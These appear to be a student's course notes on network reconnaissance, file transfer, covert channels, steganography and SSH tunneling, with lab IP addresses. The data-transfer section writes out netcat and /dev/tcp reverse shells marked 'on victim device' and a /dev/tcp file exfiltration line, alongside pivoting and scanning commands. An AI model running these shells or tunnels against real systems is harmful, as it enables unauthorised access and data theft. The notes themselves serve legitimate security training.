        - P0F can guess OS & version as well as client/server application & version
        - more /etc/p0f/p0f.fp
        - sudo p0f -i eth0
        - sudo p0f -r test.pcap
- Social Tactics: 
        - Social Engineering
        - Email/SMS/Bluetooth
        - Shoulder Surfing/Dumpster Diving
ACTIVE EXTERNAL
- 2 Scanning Natures: Active / Passive
- 4 Scanning Strategies: Remote to Local, Local to Remote, Local to Local, Remote to Remote
- 2 Scanning Aim ranges: Wide range target scan / Target specific scan
- 4 Scanning Methods: Single sources scan (1-to-1 or 1-to-many) / Distributed scan (many-to-one or many-to-many)
- Vertical scan: Scan some (or all) ports on a single target
- Horizontal scan: Scan a single port across multiple targets
- Strobe scan: Scan a predefined subset of ports on a range of targets (in a distributed strobe scan, each source does a horizontal scan on different ports)
- Block scan: Scan all (or a range of) ports on a range of targets
- Ping: ping 172.16.82.106 -c 1
- Ping sweep: for i in {1..254}; do (ping -c 1 172.16.82.$i | grep "bytes from" &) ; done
- Nmap: scans 1000 most commonly used TCP/UDP ports by default.
        - User: TCP Full Connect Scan (-sT) / Root: TCP SYN Scan (-sS)
        - Nmap port states: open, closed, filtered, unfiltered, open|filtered, closed|filtered
        - Nmap scan types: Broadcast Ping/Ping sweep (-sP, -PE), SYN scan (-sS), Full connect scan (-sT), Null scan (-sN), FIN scan (-sF), XMAS tree scan (-sX), UDP scan (-sU),
          Idle scan (-sI), Decoy scan (-D), ACK/Window scan (-sA), RPC scan (-sR), FTP scan (-b), OS fingerprinting scan (-O), Version scan (-sV)
        - Nmap options: ICMP ping (-PE), No ping (-Pn), Timeout levels (-T{0-5}) (ranges from T0 "Paranoid" at 300s to T5 "Insane" at 250ms)
        - Nmap scan delay: Minimum delay between probes (--scan-delay <time>), Max delay between probes (--max-scan-delay <time>)
        - Nmap rate limit: Minimum packets per second (--min-rate <number>), Max packets per second (--max-rate <number>)
- Traceroute ("Firewalking")
        - traceroute 172.16.82.106
        - sudo traceroute 172.16.82.106 -T -p 443
- Netcat: nc [Options] [Target IP] [Target Port(s)]
        - Netcat options: Port scanning mode (-z), verbose (-v / -vv), -n (don't resolve IPs), -w1 (set timeout value to 1), -u (use UDP)
        - Horizontal Scanning:
                - TCP: for i in {1..254}; do nc -nvzw1 172.16.82.$i 20-23 80 2>&1 & done | grep -E 'succ|open'
                - UDP: for i in {1..254}; do nc -nuvzw1 172.16.82.$i 1000-2000 2>&1 & done | grep -E 'succ|open'
        - Vertical Scanning:
                - TCP: nc -nzvw1 172.16.82.106 21-23 80 2>&1 | grep -E 'succ|open'
                - UDP: c -nuzvw1 172.16.82.106 1000-2000 2>&1 | grep -E 'succ|open'
        - Banner Grabbing: find out what is running on a particular port (-u to switch to udp port)
                - nc -u 172.16.82.106 53
- Curl/Wget: used to interact with the http, https and ftp protocols
        - Curl: Displays ASCII (curl {ftp / http / https}://172.16.82.106)
        - Wget: Downloads (wget -r {ftp / http / https}://172.16.82.106)
PASSIVE INTERNAL
- Packet Sniffers: Wireshark, tcpdump, p0f (limited to traffic in same local area of network)
- IP configuration:
        - Windows: ipconfig /all
        - Linux: ip address (ifconfig depreciated)
        - VyOS: show interface
- DNS configuration:
        - Windows: ipconfig /displaydns
        - Linux: cat /etc/resolv.conf
- ARP cache:
        - Windows: arp -a
        - Linux: ip neighbor (arp -a depreciated)
- Network connections:
        - Windows: netstat
        - Linux: ss (netstat depreciated)
        - Options (both netstat and ss): a (displays all active connections/ports), n (show port#), t (tcp only), u (udp only), p (shows which processes use which sockets)
- Servces file:
        - Windows: %SystemRoot%\system32\drivers\etc\services
        - Linux/Unix: /etc/services
- OS information:
        - Windows: systeminfo
        - Linux: uname -a and /etc/os-release
- Running processes:
        - Windows: tasklist
        - Linux: ps or top
                - ps -elf: -e (all running), -l (long format), -f (full format)
- Command path: which / whereis (whereis is better - will usually show not only binary but also sbin location, location of config file, and location of documentation file)
- Routing table:
        - Windows: route print
        - Linux: ip route (netstat -r deprecated)
        - VyOS: show ip route
- File search:
        - find / -name hint* 2> /dev/null
        - find / -iname flag* 2> /dev/null
- SSH config:
        - Windows: C:\Windows\System32\OpenSSH\sshd_config
        - Linux: /etc/ssh/sshd_config
ACTIVE INTERNAL:
- Similar tools & methods as active external recon
- ARP scanning:
        arp-scan --interface=eth0 --localnet
        nmap -sP -PR 172.16.82.96/27
- Ping scanning:
        ping -c 1 172.16.82.106
        for i in {1..254}; do (ping -c 1 172.16.82.$i | grep "bytes from" &) ; done
        sudo nmap -sP 172.16.82.96/27
- Dev TCP banner grap: exec 3<>/dev/tcp/172.16.82.106/22; echo -e "" >&3; cat <&3
- Dev TCP scanning: for p in {1..1023}; do(echo >/dev/tcp/172.16.82.106/$p) >/dev/null 2>&1 && echo "$p open"; done
NETWORK FORENSICS
- Network Mapping Tools: draw.io, witeboard.com, draw.chat, smartdraw, ziteboard, tutorialspoint whiteboard, explain everything whiteboard
- Mapping: Device type (router/host), hostnames, interface names, IPs/CIDRs for interfaces, TCP/UDP ports, MAC address, OS type/ver, known credentials
- Mapping: Diagram devices line types, written information, coloring, groupings


Section 4 (M,T,W): Data Transfer, Movement and Redirection
- Common file transer methods: FTP (active & passive), TFTP, SCP, SFTP, FTPS
- TFTP: Trivial File Transfer Protocol
        - RFC 1350 rev2
        - UDP, very small & simple communication
        - No terminal communication, no directory services
        - No authentication or encryption
- FTP: File Transfer Protocol
        - RFC 959
        - 2 separate TCP connections: 21 (control), 20 (data)
        - Authentication in clear-text, anonymous login - insecure in default config
        - Has directory services
        - Active: server reaches out to client (pizza delivery - you call, pizza is delivered)
        - Passive: client reaches out to server (pizza pickup - you go in and take out)
- FTP commands:
        - FTP Active (anonymous): ftp 10.0.0.104 -> anonymous
        - FTP Active (user): ftp 10.0.0.104 -> sonnyjim > (password)
        - FTP Passive (wget): proxychains wget -r ftp://10.0.0.104 -> anonymous
        - FTP Passive (anonymous): ftp 10.0.0.104 -> anonymous
        - FTP Passive (user): proxychains ftp 10.0.0.104 -> sonnyjim -> (password)
- FTPS: File Transfer Protocol Secure
        - Adds SSL/TLS encryption
        - Interactive terminal access
        - Explicit mode: option for encryption, ports 20/21
        - Implicit mode: encryption assumed, ports 989/990
- SFTP: Secure File Transfer Protocol (SSH FTP)
        - TCP 22
        - Adds FTP-like services to SSH
        - Symmetric & asymmetric encryption, authentication through username/pass or with SSH key
        - Interactive terminal access
- SCP: Secure Copy Protocol
        - TCP 22
        - Uses symmetric & asymmetric encryption
        - Authentication through username & password or with SSH key
        - Non-interactive
        -v = verbose mode, -P = alternate port, -r = recursively copy entire directory, -3 = 3-way copy
        - scp student@172.16.82.106:secretstuff.txt /home/student (download from remote to local)
        - scp secretstuff.txt student@172.16.82.106:/home/student (upload from local to remote)
        - scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student (copy from remote to remote)
        - scp -r folder/ student@172.16.82.106: (upload folder to remote)
        - scp -r student@172.16.82.106:folder/ . (download folder to local)
- SCP with tunneling
        - Local port forward
                - ssh student@172.16.82.106 -L 1111:localhost:22 -NT (create local port foward to target device)
                - scp -P 1111 student@localhost:secretstuff.txt /home/student (download from remote to local over tunnel)
                - scp -P 1111 secretstuff.txt student@localhost:/home/student (upload from local to remote over tunnel)
        - Remote port forward
                - ssh student@172.16.82.106 -D 9050 -NT (create dynamic port forward)
                - proxychains scp student@localhost:secretstuff.txt . (download from remote to local)
                - proxychains scp secretstuff.txt student@localhost: (upload from local to remote)
- Uncommon methods of file transfer:
- Netcat: simply reads & writes data across sockets using TCP/IP protocol
        - nc -lvp 9001 > newfile.txt (listener - receiving file)
        - nc 172.16.82.106 9001 < file.txt (client - sending file)
        - nc -lvp 9001 < file.txt (listener - sending file)
        - nc 172.16.82.106 9001 > newfile.txt (client - receiving file)
        - Listener to listener:
                - mknod mypipe p
                  nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe (on Blue_Host-1 Relay)
                - nc 172.16.82.106 1111 < secret.txt (on Internet_Host - sending)
                - nc 192.168.1.1 3333 > newsecret.txt (on Blue_Priv_Host-1 - receiving)
        - Client to client:
                - nc -lvp 1111 < secret.txt (on Internet_Host - sending)
                - nc -lvp 3333 > newsecret.txt (on Blue_Priv_Host-1 - receiving)
                - mknod mypipe p
                  nc 10.10.0.40 1111 < mypipe | nc 192.168.1.10 3333 > mypipe (on Blue_Host-1 Relay)
        - Client to listener:
                - nc -lvp 1111 < secret.txt (on Internet_Host - sending)
                - nc 192.168.1.1 3333 > newsecret.txt (on Blue_Priv_Host-1 - receiving)
                - mknod mypipe p
                  nc 10.10.0.40 1111 < mypipe | nc -lvp 3333 > mypipe (on Blue_Host-1 Relay)
        - Listener to client:
                - nc 172.16.82.106 1111 < secret.txt (on Internet_Host - sending)
                - nc -lvp 3333 > newsecret.txt (on Blue_Priv_Host-1 - receiving)
                - mknod mypipe p
                  nc -lvp 1111 < mypipe | nc 192.168.1.10 3333 > mypipe (on Blue_Host-1 Relay)
- File transfer with /dev/tcp: useful for a host that doesn't have netcat available
        - On receiving box: nc -lvp 1111 > devtcpfile.txt
        - On sending box: cat secret.txt > /dev/tcp/10.10.0.40/1111
- Reverse shell with netcat
        - On your device: nc -lvp 9999 (listen for the shell)
        - On victim device: nc -c /bin/bash 10.10.0.40 9999
        - On victim device: nc -e /bin/bash 10.10.0.40 9999
- Reverse shell with /dev/tcp
        - On your device: nc -lvp 9999 (listen for the shell)
        - On victim device: /bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1
PACKING/ENCODING
- Packers: special code added to programs to compress executables
        - Reduces network traffic, good for obfuscation, reduces time on target (example: UPX)
- Encoding: Specialized formatting used for transmission & storage (Base64 & hex are most common)
        - Hex encoding: used by IPv6 & MAC addresses, color schemes. Increases readability & information density
                - XXD: converts to hex
                - echo "Hex encoding test" | xxd -p (-p converts to a plain hex dump, -r -p restores that plain hex dump back to original text)
                  (output) 48657820656e636f64696e6720746573740a
        - Base64 encoding: binary-to-text encoding. A-Z, a-z, 1-9, +, /
                - 6 bits per digit, 4 characters = 3 bytes = 1 group
                - padding used to fill any unused space in each 24-bit group
                - base64 -w0 logoCyber.png (-w0 to remove line wrapping. output file converted to base64, -d decodes from base64)
SSH TUNNELING
- Tunneling: encapsulating a protocol inside another protocol (encapsulation -> transmission -> decapsulation)
        - IPv6 transition uses tunneling (traffic tunneling - IPv6 over IPv4)
        - Tunneling can be used to bypass IPv4-based security measures for malware/attacks
        - Dual stack, 6in4, 6to4, 4in6, Teredo, ISATAP
- Covert channels: using common and legitimate protocols to transfer data in illegitimate ways (bypassing security, violating policies, leaking data, unauthorized/hidden communication)
        - Common protocols: ICMP, DNS, HTTP
        - Timing indicators: TTL changes, delayed packets between nodes, variances between transmissions
                - ICMP indicators: payload imbalance, request/response imbalance, large payloads in response
                - DNS indicators: payloads exceeding 512 bytes or otherwise unusual, anything other than 1 response per 1 request, burstiness or continuous use
                - HTTP indicators: GET request including .png, .exe, etc.
        - Can hide data inside headers - IP Header (TOS, IP ID, Flags + Fragmentation, and Options) or TCP Header (Reserved, URG Pointer, and Options)
        - Detect via host analysis (requires knowledge of expected application behavior) or network analysis (requires knowledge of your network and normal network protocols/traffic)
                - BASELINING
        - ICMP Covert channel tools: ptunnel, Loki, 007shell, ICMP Backdoor, B0CK, Hans
        - DNS Covert channel tools: OzymanDNS, NSTX, dns2tcp, iodine, heyoka, dnscat2
        - HTTP Covert channel tools: tunnelshell tools, HTTPTunnel, SirTunnel, go HTTP tunnel
STEGGING
- Steganography: hiding messages inside legit information objects
        - Methods: injection, substitution, propagation
- Substitution: inserting message into insignificant portion of the file. Most common method (example: change color palette +1/-1)
- Injection: inserting message into unused (whitespace) of the file, usually in a graphic. 2nd most common method (adds size to the file, hard to detect unless you have original file
        - Tools: StegHide
- Propagation: generates a new file entirely. 3rd most common method (requires special software to manipulate file)
        - Tools: StegSecret, HyDEn, Spammimic
SSH TUNNELING
- Don't reuse ports (it will give you the nasty remote host ID changed / someone may be eavesdropping warning)
        - copy/paste the ssh-keygen message to remove the host key from the known_hosts file if it was just you messing up
- On first connect, you will need to approve the public key (key is saved to /home/student/.ssh/known_hosts)
- SSH: is capable of tunneling other protocols through it (examples: terminator through ssh, X11 forwarding, xdg to open png files, etc.)
        - NOTE: when tunneling an insecure protocol like telnet or HTTP through SSH, it GAINS SSH-LEVEL SECURITY
        - used for tunneling & port forwarding - proxy connections
- Keys:
        - User Key - Asymmetric public key used to identify the user to the server
        - Host Key - Asymmetric public key used to identify the server to the user
        - Session Key - Symmetric key created by the client and server to protect the sessions communication.
- Configuration files:
        - Client Configuration File (/etc/ssh/ssh_config)
        - Server Configuration File (/etc/ssh/sshd_config)
        - Known Hosts File (~/.ssh/known_hosts)
- SSH port forwarding/tunneling options:
        -L - Creates a port on the client mapped to a ip:port via the server
        -R - Creates the port on the server mapped to a ip:port via the client
        -D - Creates a port on the client and sets up a SOCKS4 proxy tunnel where the target ip:port is specified dynamically
        -NT - Do not execute a remote command and disable pseudo-tty (will hang window)
SSH TUNNELING COMMANDS
- USE 51600-51699 ports
- Local port forwarding to localhost of server:
        - Basic syntax: ssh -p <optional alt port> <user>@<server ip> -L <local bind port>:<tgt ip>:<tgt port> -NT
                OR ssh -L <local bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<server ip> -NT
        On local: ssh student@172.16.1.15 -L 1122:localhost:22, then run ssh student@localhost -p 1122 (SSH)
                OR On local: ssh -L 1122:localhost:22 student@172.16.1.15, then run ssh student@localhost -p 1122
        On local: ssh student@172.16.1.15 -L 1123:localhost:23, then run telnet localhost 1123 (Telnet)
                OR On local: ssh -L 1123:localhost:23 student@172.16.1.15, then run telnet localhost 1123
        On local: ssh student@172.16.1.15 -L 1180:localhost:80, then run firefox http://localhost:1180 (HTTP)
                OR On local: ssh -L 1180:localhost:80 student@172.16.1.15, then run firefox http://localhost:1180
- Local port forwarding to remote target via server:
        On local: ssh student@172.16.1.15 -L 2222:172.16.40.10:22, then ssh student@localhost -p 2222 (SSH)
                OR On local: ssh -L 2222:172.16.40.10:22 student@172.16.1.15, then ssh student@localhost -p 2222
        On local: ssh student@172.16.1.15 -L 2223:172.16.40.10:23, then telnet localhost 2223 (Telnet)
                OR On local: ssh student@172.16.1.15 -L 2223:172.16.40.10:23, then telnet localhost 2223
        On local: ssh student@172.16.1.15 -L 2280:172.16.40.10:80, then firefox http://localhost:2280 (HTTP)
                OR On local: ssh -L 2280:172.16.40.10:80 student@172.16.1.15, then firefox http://localhost:2280
- Forward through tunnel:
        On local: ssh student@172.16.1.15 -L 2222:172.16.40.10:22 (SSH)
             then ssh student@localhost -p 2222 -L 3322:172.16.82.106:22
             then ssh student@localhost -p 3322
        On local: ssh student@172.16.1.15 -L 2222:172.16.40.10:22 (Telnet)
             then ssh student@localhost -p 2222 -L 3323:172.16.82.106:23
             then telnet localhost 3323
        On local: ssh student@172.16.1.15 -L 2222:172.16.40.10:22 (HTTP)
             then ssh student@localhost -p 2222 -L 3380:172.16.82.106:80
             then firefox http://localhost:3380
- Dynamic port forwarding:
        - Basic syntax: ssh <user>@<server ip> -p <alt port> -D <port> -NT OR ssh <user>@<server ip> -p <alt port> -D <port> -NT
        - Proxychains default port is 9050
        - Creates a dynamic socks4 proxy that interacts alone, or with a previously established remote or local port forward
        - Allows the use of scripts and other userspace programs through the tunnel
        On local: ssh student@172.16.1.15 -D 9050 OR ssh -D 9050 student@172.16.1.15 (1 step)
                then on local:
                proxychains ./scan.sh
                proxychains nmap -Pn 172.16.40.0/27 -p 21-23,80
                proxychains ssh student@172.16.40.10
                proxychains telnet 172.16.40.10
                proxychains wget -r http://172.16.40.10
                proxychains wget -r ftp://172.16.40.10
        On local: ssh student@172.16.1.15 -L 2222:172.16.40.10:22 OR ssh -L 2222:172.16.40.10:22 student@172.16.1.15
                then on local: ssh student@localhost -p 2222 -D 9050 OR ssh -D 9050 student@localhost -p 2222
                then on local:
                proxychains ./scan.sh
                proxychains nmap -Pn 172.16.82.96/27 -p 21-23,80
                proxychains ssh student@172.16.82.106
                proxychains telnet 172.16.82.106
                proxychains wget -r http://172.16.82.106
                proxychains wget -r ftp://172.16.82.106
- Remote port forwarding from localhost of client:
        - Basic syntax: ssh -p <optional alt port> <user>@<server ip> -R <remote bind OR ssh -R <remote bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<server ip> -NT
        On remote: ssh student@10.10.0.40 -R 4422:localhost:22 OR ssh -R 4422:localhost:22 student@10.10.0.40 (SSH)
                then on local: ssh student@localhost -p 4422
        On remote: ssh student@10.10.0.40 -R 4423:localhost:23 OR ssh -R 4423:localhost:23 student@10.10.0.40 (Telnet)
                then on local: telnet localhost 4423
        On remote: ssh student@10.10.0.40 -R 4480:localhost:80 OR ssh -R 4480:localhost:80 student@10.10.0.40 (HTTP)
                then on local: firefox http://localhost:4480
- Remote port forwarding to remote target via client:
        On remote: ssh student@10.10.0.40 -R 5522:172.16.40.10:22 OR ssh -R 5522:172.16.40.10:22 student@10.10.0.40 (SSH)
                then on local: ssh student@localhost -p 5522
        On remote: ssh student@10.10.0.40 -R 5523:172.16.40.10:23 OR ssh -R 5523:172.16.40.10:23 student@10.10.0.40 (Telnet)
                then on local: telnet localhost 5523
        On remote: ssh student@10.10.0.40 -R 5580:172.16.40.10:80 OR ssh -R 5580:172.16.40.10:80 student@10.10.0.40 (HTTP)
                then on local: firefox http://localhost:5580
- Combined / bridging remote & local port forwarding
        On local: ssh student@172.16.1.15 -L 2223:172.16.40.10:23 -NT OR ssh -L 2223:172.16.40.10:23 student@172.16.1.15 -NT
                then on local: telnet localhost 2223
        On remote: ssh student@172.16.1.15 -R 1122:localhost:22 OR ssh -R 1122:localhost:22 student@172.16.1.15
        On local: ssh student@172.16.1.15 -L 2222:localhost:1122 OR ssh -L 2222:localhost:1122 student@172.16.1.15
        On local: ssh student@localhost -p 2222 -D 9050 OR ssh -D 9050 student@localhost -p 2222
        then on local:
        proxychains ./scan.sh
        proxychains nmap -Pn -sT 172.16.82.96/27 -p 21-23,80
        proxychains ssh student@172.16.82.106
        proxychains telnet 172.16.82.106
        proxychains wget -r http://172.16.82.106
        proxychains wget -r ftp://172.16.82.106


Section 5 (Th): Network Analysis



Section 6 (F): Network Traffic Filtering



Section 7 (M,T): Capstone
